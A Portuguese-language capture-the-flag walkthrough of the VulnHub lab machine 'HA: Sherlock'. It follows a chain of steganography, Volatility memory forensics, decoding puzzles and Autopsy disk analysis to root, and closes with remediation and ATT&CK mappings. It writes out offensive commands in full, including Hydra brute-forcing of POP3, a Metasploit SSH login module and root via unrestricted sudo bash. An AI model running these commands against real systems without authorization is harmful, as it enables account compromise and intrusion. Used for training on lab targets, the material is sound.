# HA: Sherlock — Elementar, Meu Caro Pentester: Siga Cada Pista até o Root

"Quando você eliminar o impossível, o que restar, por mais improvável que pareça, deve ser a verdade." Sherlock Holmes construiu seu método em observação exaustiva e eliminação sistemática. HA: Sherlock exige exatamente isso. Código Morse no banner do SSH. Esteganografia escondida dentro de um arquivo de vídeo. Forense de memória para recuperar um texto que estava aberto em um desktop Windows. Esteganografia em áudio em um arquivo WAV. Uma credencial Base64 enterrada três camadas abaixo. Cada pista é um passo atrás da próxima. A máquina vale 100 pontos por uma razão. Elementar? Longe disso. Trabalho de detetive de verdade até o root.

| Campo | Valor |
|---|---|
| **Nível** | Intermediário |
| **VM Alvo** | HA: Sherlock |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/ha-sherlock,580/ |
| **Técnicas** | Varredura Nmap multi-serviço, revisão de código-fonte HTML, decode de código Morse, esteganografia de vídeo OurSecret, brute-force POP3 com Hydra, conversão de timestamp epoch, forense de memória Volatility (WinXP notepad), decode ROT13, login FTP, forense de imagem de disco Autopsy, brute-force SSH com Metasploit, esteganografia de áudio DeepSound, decode Base64, escalação via sudo bash |
| **CVEs** | CWE-522 (Credenciais Insuficientemente Protegidas: senha POP3 fraca), CWE-269 (Gerenciamento de Privilégio Impróprio: sudo bash irrestrito), CWE-200 (Exposição de Informação: dump de memória e imagem de disco publicamente acessíveis) |
| **Grupos APT** | APT38 (Lazarus/Coreia do Norte financeiro): usa esteganografia em múltiplas camadas em arquivos de áudio e imagem para comunicação C2 e armazenamento de credenciais; Lazarus Group: encadeia múltiplas técnicas de codificação para esconder credenciais de ferramentas automáticas de detecção |

---

## Resumo do Ataque

```
nmap → FTP (21), SSH (22), SMTP (25), HTTP (80), POP3 (110), IMAP (143)
  → http://alvo/ → ver fonte → <!-- irene.mp4 → pista Sherlock -->
  → wget irene.mp4
  → banner SSH → decode código Morse → BASKERVILLE
  → OurSecret (irene.mp4, senha: BASKERVILLE) → 15_points.txt (15 pts)
  → hydra -l harshit -P rockyou.txt alvo pop3s → harshit:superman
  → POP3 RETR 1 → timestamp: 27 mai 2020 11:02:09
  → date -d "..." +%s → 1590573729
  → http://alvo/1590573729/ → 10_Points.txt (10 pts) + john.mem
  → volatility imageinfo john.mem → WinXPSPx86
  → volatility notepad → Thcbgpune → ROT13 → Guptchar
  → ftp alvo → john:Guptchar → get mycroft.001
  → Autopsy (mycroft.001) → important/ → 10_pts.txt (10 pts) + hint.jpg
  → hint hex 16 = 22 (dica porta SSH) + string hex → khufiya
  → msf ssh_login (mycroft:Khufiya) → download 15_Points.txt + jim.wav
  → deepsound2john.py jim.wav → john → poohbear
  → DeepSound (jim.wav, poohbear) → 15_pts.txt (15 pts) + base64 QmhlZGl5YQ==
  → base64 -d → Bhediya
  → su sherlock (Bhediya) → sudo -l → sudo bash
  → sudo bash → uid=0(root) → cat /root/final.txt (25 pts)
  → Total: 100 pontos
```

---

## Metodologia

1. Varredura completa de portas multi-serviço: FTP, SSH, SMTP, HTTP, POP3, IMAP
2. Inspeção do código-fonte web para encontrar pista de vídeo oculto
3. Decode do código Morse no banner SSH para extrair senha de esteganografia
4. Extração de esteganografia de vídeo OurSecret (15 pts)
5. Brute-force POP3 com Hydra para acessar email
6. Conversão de timestamp epoch para descobrir diretório web oculto
7. Forense de memória Volatility de dump Windows XP (10 pts)
8. Decode ROT13 para extrair senha FTP
9. Acesso FTP e forense de imagem de disco Autopsy (10 pts + dica)
10. Brute-force SSH com Metasploit com senha descoberta
11. Extração de esteganografia de áudio DeepSound (15 pts)
12. Decode Base64 para recuperar senha do sherlock
13. Escalação root via sudo bash (25 pts)

---

## Passo 1 — Descoberta de Host e Varredura Multi-Serviço

```bash
sudo netdiscover
# Alvo: 192.168.0.170

nmap -sV 192.168.0.170
```

```
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 3.0.3
22/tcp  open  ssh     OpenSSH 7.x
25/tcp  open  smtp    Postfix smtpd
80/tcp  open  http    Apache httpd
110/tcp open  pop3    Dovecot pop3d
143/tcp open  imap    Dovecot imapd
```

Seis serviços. Esta máquina é construída em torno de investigação multi-protocolo. Enumere todos antes de se comprometer com um caminho de ataque.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Código-Fonte Web: Pista de Vídeo Oculto

Navegue até `http://192.168.0.170/`. Veja o código-fonte:

```bash
curl -s http://192.168.0.170/ | grep -i "comment\|video\|mp4\|irene"
```

Encontra um comentário HTML:

```html
<!-- irene.mp4 → pista Sherlock -->
```

Baixe o vídeo:

```bash
wget http://192.168.0.170/irene.mp4
```

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1552.001 — Credenciais em Arquivos

---

## Passo 3 — Decode de Código Morse no Banner SSH

O banner SSH contém código Morse. Leia-o:

```bash
ssh 192.168.0.170
# Não autentique: leia o texto do banner com atenção
# Mostrará pontos e traços
```

Decodifique o código Morse (use dcode.fr, CyberChef ou decodificador Morse):

```bash
# Morse decodificado: BASKERVILLE
# (Referência: O Cão dos Baskervilles)
```

Essa é a senha para a esteganografia do vídeo.

**MITRE ATT&CK:** T1027 — Arquivos ou Informações Ofuscados; T1552 — Credenciais Não Protegidas

---

## Passo 4 — Esteganografia de Vídeo OurSecret (15 Pontos)

`irene.mp4` contém dados ocultos esteganograficamente usando OurSecret (ferramenta de esteganografia Windows):

```bash
# No Windows ou via Wine:
# Abrir OurSecret
# Carregar irene.mp4
# Inserir senha: BASKERVILLE
# Extrair arquivo embutido: 15_points.txt
```

**15 pontos** capturados.

**Nota do mundo real:** Esteganografia de vídeo esconde dados nos bits menos significativos de frames de vídeo ou faixas de áudio. Ferramentas como OurSecret, SteghideOpenSSL e OpenPuff são usadas em design de CTF e em operações reais de exfiltração de dados. O APT38 tem uso documentado de esteganografia de áudio e vídeo para comunicação C2.

**MITRE ATT&CK:** T1027 — Arquivos ou Informações Ofuscados; T1020 — Exfiltração Automatizada

---

## Passo 5 — Brute-Force POP3

Force bruta no POP3 para o usuário harshit:

```bash
hydra -l harshit -P /usr/share/wordlists/rockyou.txt 192.168.0.170 pop3s
# Encontrado: harshit:superman
```

Leia o email via POP3:

```bash
openssl s_client -connect 192.168.0.170:995
USER harshit
PASS superman
LIST
RETR 1
```

O corpo do email contém um timestamp: **27 de maio de 2020 11:02:09**

**MITRE ATT&CK:** T1110.001 — Força Bruta: Adivinhação de Senha; T1114 — Coleta de Email

---

## Passo 6 — Timestamp Epoch para Diretório Web Oculto

Converta o timestamp do email para Unix epoch:

```bash
date -d "May 27 2020 11:02:09" +%s
# 1590573729
```

Navegue até `http://192.168.0.170/1590573729/`:

```bash
curl http://192.168.0.170/1590573729/
# Arquivos: 10_Points.txt, john.mem
wget http://192.168.0.170/1590573729/10_Points.txt
wget http://192.168.0.170/1590573729/john.mem
```

**10 pontos** capturados. `john.mem` é um dump de memória Windows — o prêmio real aqui.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 7 — Forense de Memória Volatility

Analise o dump de memória do Windows XP:

```bash
volatility -f john.mem imageinfo
# Perfil sugerido: WinXPSP2x86

volatility -f john.mem --profile=WinXPSPx86 notepad
```

Saída:

```
Thcbgpune
```

Está codificado em ROT13. Decodifique:

```bash
echo "Thcbgpune" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# Guptchar
```

Guptchar é a senha FTP para o usuário john.

**Nota do mundo real:** O plugin notepad do Volatility recupera texto que estava visível no Notepad.exe no momento da captura de memória. Na resposta a incidentes reais, essa técnica recupera senhas, notas e comandos que estavam sendo ativamente usados. A forense de memória regularmente recupera credenciais que nunca tocaram o disco.

**MITRE ATT&CK:** T1003 — Dumping de Credenciais do OS; T1027 — ROT13

---

## Passo 8 — Login FTP e Forense de Imagem de Disco

```bash
ftp 192.168.0.170
# Usuário: john
# Senha: Guptchar

ftp> ls
ftp> get mycroft.001
ftp> quit
```

Abra `mycroft.001` como imagem de disco raw no Autopsy:

```bash
# Autopsy: Arquivo → Novo Caso → Adicionar Fonte de Dados → Imagem de Disco → mycroft.001
# Navegue para: important/
# Arquivos: 10_points.txt + hint.jpg
```

**10 pontos** capturados. A dica em `hint.jpg`:
- Hex `16` = decimal 22 (dica de porta SSH)
- String hex decodifica para: `khufiya`

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1027 — Arquivos Ofuscados

---

## Passo 9 — Brute-Force SSH com Metasploit

Use Metasploit para force bruta SSH do usuário mycroft com a senha descoberta:

```bash
msfconsole -q
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.0.170
set USERNAME mycroft
set PASS_FILE /tmp/pass.txt  # contém: Khufiya
set VERBOSE true
run
# Sessão aberta
```

Baixe arquivos da sessão:

```bash
sessions -u 1
sessions 2
download 15_Points.txt
download jim.wav
```

**15 pontos** capturados. `jim.wav` é o próximo quebra-cabeça.

**MITRE ATT&CK:** T1110.001 — Força Bruta: Adivinhação de Senha; T1078 — Contas Válidas

---

## Passo 10 — Esteganografia de Áudio DeepSound

Extraia o hash DeepSound para quebrar a senha do arquivo WAV:

```bash
python /usr/share/john/deepsound2john.py jim.wav > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
# Quebrado: poohbear
```

Abra `jim.wav` no **DeepSound** (aplicativo Windows) com senha `poohbear`. Extrai:
1. `15_pts.txt` — mais 15 pontos
2. Uma mensagem PGP falsa com Base64: `QmhlZGl5YQ==`

```bash
echo "QmhlZGl5YQ==" | base64 -d
# Bhediya
```

Bhediya é a senha para o usuário sherlock.

**Nota do mundo real:** Esteganografia de áudio esconde dados nos bits menos significativos de amostras de áudio. O DeepSound é uma ferramenta Windows que pode embutir arquivos criptografados dentro de arquivos WAV ou FLAC. O conteúdo embutido é invisível à inspeção casual e passa pela maioria das ferramentas automáticas de escaneamento de conteúdo.

**MITRE ATT&CK:** T1027 — Arquivos ou Informações Ofuscados; T1020 — Exfiltração Automatizada

---

## Passo 11 — Root via sudo bash

```bash
su sherlock
# Senha: Bhediya

sudo -l
# (ALL) NOPASSWD: /bin/bash

sudo bash

id
# uid=0(root) gid=0(root) groups=0(root)

cd /root
cat final.txt   # 25 pts
cat 25_Point.txt
```

(☞ﾟヮﾟ)☞ Root. O caso está encerrado. 100 pontos.

**MITRE ATT&CK:** T1548.003 — Abuso de Mecanismo de Elevação: Sudo; T1059.004 — Shell Unix

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado em | Pontos |
|---|---|---|---|
| Flag 1 (15 pts) | 15_points.txt | OurSecret irene.mp4 (chave BASKERVILLE) | 15 |
| Flag 2 (10 pts) | 10_Points.txt | Diretório epoch /1590573729/ | 10 |
| Flag 3 (10 pts) | 10_points.txt | Autopsy → mycroft.001 → important/ | 10 |
| Flag 4 (15 pts) | 15_Points.txt via Meterpreter | Download sessão Metasploit SSH | 15 |
| Flag 5 (15 pts) | 15_pts.txt | DeepSound jim.wav (chave poohbear) | 15 |
| Flag root (25 pts) | /root/final.txt + 25_Point.txt | sudo bash como sherlock | 25 |
| Credencial | harshit:superman | Brute-force POP3 | Acesso ao email |
| Credencial | john:Guptchar | Volatility notepad → ROT13 | Acesso FTP |
| Credencial | mycroft:Khufiya | hint.jpg Autopsy hex | Alvo brute-force SSH |
| Credencial | sherlock:Bhediya | Decode Base64 DeepSound | su + sudo bash |

---

## Lições Aprendidas

| # | Descoberta | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | Código Morse no banner SSH esconde senha | Divulgação de informação não-padrão via banners de serviço é rara mas real | Parse e investigue todo o conteúdo de banner de serviço durante enumeração |
| 2 | Cadeia de esteganografia de vídeo e áudio para credenciais | Grupos APT usam esteganografia em arquivos de mídia para C2 e armazenamento de credenciais em escala | Implemente DLP e análise de conteúdo de arquivo; marque arquivos de mídia inesperados em servidores |
| 3 | Forense de memória recupera credenciais em uso ativo | Recuperação notepad/clipboard Volatility é técnica padrão de resposta a incidentes | Trate dumps de memória como contendo credenciais em texto claro; controle acesso a dumps estritamente |
| 4 | Caminhos URL baseados em epoch obscurecem diretórios ocultos | Obscuridade por URLs de timestamp não fornece segurança real | Segurança por obscuridade falha; use controles de acesso adequados |
| 5 | sudo bash garante root irrestrito | `sudo bash` ou `sudo -s` sem senha é equivalente a root irrestrito | Nunca permita sudo para shells ou interpretadores sem justificativa estrita |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Adivinhação de Senha | T1110.001 |
| Coleta | Coleta | Coleta de Email | T1114 |
| Acesso a Credenciais | Acesso a Credenciais | Dumping de Credenciais OS (forense de memória) | T1003 |
| Evasão de Defesa | Evasão de Defesa | Arquivos Ofuscados: Esteganografia | T1027 |
| Movimento Lateral | Movimento Lateral | Contas Válidas | T1078 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso de Mecanismo de Elevação: Sudo | T1548.003 |
| Execução | Execução | Interpretador de Script: Shell Unix | T1059.004 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Forçar senhas POP3 fortes**: nunca use `superman` ou palavras de dicionário; implementar bloqueio de conta após tentativas falhas; habilitar 2FA para email
2. **Remover dump de memória do servidor web**: `john.mem` nunca deve ser publicamente acessível; restringir acesso a artefatos forenses
3. **Remover imagem de disco do FTP**: `mycroft.001` é um arquivo sensível; remover de contas anônimas ou facilmente bruteforçadas
4. **Remover sudo bash**: nunca permitir `sudo /bin/bash` ou `sudo ALL` sem justificativa estrita e requisito de senha
5. **Rotacionar todas as credenciais expostas**: harshit:superman, john:Guptchar, mycroft:Khufiya, sherlock:Bhediya estão todas comprometidas

### Contramedidas MITRE D3FEND

- **D3-ACH**: Hardening de Configuração de Aplicação (desabilitar FTP anônimo; restringir acesso POP3)
- **D3-OAM**: Gerenciamento Administrativo de SO (restrições sudo)
- **D3-CE**: Evicção de Credenciais (rotacionar todas as credenciais expostas)

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todos os serviços de email; auditar arquivos acessíveis em FTP e servidores web |
| Proteger | Controle de Acesso | Desabilitar FTP anônimo; exigir senhas POP3 fortes; remover sudo bash |
| Proteger | Segurança de Dados | Remover artefatos forenses (dump de memória, imagem de disco) de caminhos publicamente acessíveis |
| Detectar | Anomalias e Eventos | Alertar sobre brute-force POP3; monitorar logs de acesso web para acesso a diretórios estilo epoch |
| Responder | Planejamento de Resposta | Rotacionar todas as credenciais expostas; remover artefatos forenses vazados |
| Recuperar | Planejamento de Recuperação | Auditar todas as concessões sudo; verificar que não há arquivos sensíveis no web root ou FTP |

---

## Reflexões Finais

HA: Sherlock é a máquina narrativamente mais coesa do VulnHub. Cada passo é uma pista que o próprio Sherlock Holmes seguiria: observar (fonte web), deduzir (Morse no banner), investigar (esteganografia), reconstruir (forense de memória), seguir o rastro (URL epoch), e encerrar o caso (sudo bash). A estrutura de 100 pontos pontua como um CTF de verdade.

O passo de forense de memória Volatility sozinho vale fazer esta máquina. O momento que você executa `volatility notepad` e vê texto em claro que estava em um desktop Windows anos atrás: isso é como parece e como funciona a resposta a incidentes real de verdade.

Elementar? Longe disso. Jogo, set e partida.

Que máquina insana, véi. Sensacional demais.

Thanks guys!! (❍ᴥ❍ʋ)
